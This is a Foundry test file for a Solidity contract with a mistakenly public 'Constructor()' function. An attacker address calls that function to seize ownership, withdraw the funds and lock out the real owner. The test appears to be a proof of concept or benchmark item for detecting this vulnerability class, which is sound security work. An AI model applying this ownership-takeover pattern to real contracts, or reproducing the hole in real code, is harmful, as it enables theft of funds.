// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name3.sol";

contract MissingTest is Test {
    Missing public token;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy contract with legitimate owner
        vm.startPrank(owner);
        token = new Missing();
        vm.stopPrank();

        // Fund the contract to test withdrawals
        vm.deal(address(token), 1 ether);
    }

    function test_ConstructorReinitialization() public {
        console.log("--- BEFORE-Trigger State ---");
        // Validate original owner control: attacker can't withdraw
        console.log("Verifying attacker cannot access owner function (expect revert)");
        vm.prank(attacker);
        vm.expectRevert();
        token.withdraw();

        console.log("--- Trigger Action: Constructor Reinitialization ---");
        // Attacker calls public Constructor() to set themselves as owner
        vm.prank(attacker);
        token.Constructor();
        console.log("Executed: token.Constructor()");

        console.log("--- AFTER-Trigger State ---");
        // Verify attacker gains owner privileges
        console.log("Verifying attacker now has owner access (no revert expected)");
        vm.prank(attacker);
        token.withdraw();

        // Verify original owner loses privileges
        console.log("Verifying original owner lost access (expect revert)");
        vm.prank(owner);
        vm.expectRevert();
        token.withdraw();

        // Final verdict based on successful privilege transfer
        console.log("Vulnerability Exists: Attacker bypassed access control, gained owner privileges, and locked out original owner");
    }
}